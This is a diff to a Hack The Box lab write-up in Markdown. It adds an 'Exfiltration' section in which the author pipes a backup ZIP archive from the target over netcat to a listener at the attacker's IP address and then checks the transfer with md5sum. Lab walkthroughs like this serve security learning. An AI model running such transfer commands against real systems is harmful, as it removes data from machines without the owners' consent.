@@ -178,8 +178,29 @@ Enumeration of the directories and files reveals the archive `/var/www/html/1616
 
 ---
 
-#### Crack ZIP Password
+#### Backup ZIP Archive
 Trying to unzip this returns a message prompting for a password.
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bf4b9a47-9b9c-40bd-8c07-777750af997b)
 
 ---
+
+#### Exfiltration
+Exfiltrate the `16162020_backup.zip` file to attacker machine using `netcat`.
+
+Setup Netcat Listener:
+```CSS
+▶ nc -lnvp 443 > 16162020_backup.zip
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e36ef408-053f-4638-97b6-ef3a7867d152)
+
+Transfer the file:
+```CSS
+▶ cat 16162020_backup.zip | nc 10.10.14.24 443
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1f58b767-35b3-48c6-8d48-11b386aeaaab)
+
+Match MD5:
+```CSS
+▶ md5sum 16162020_backup.zip
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b826db79-25d4-4d78-aa22-926639d73bc1)
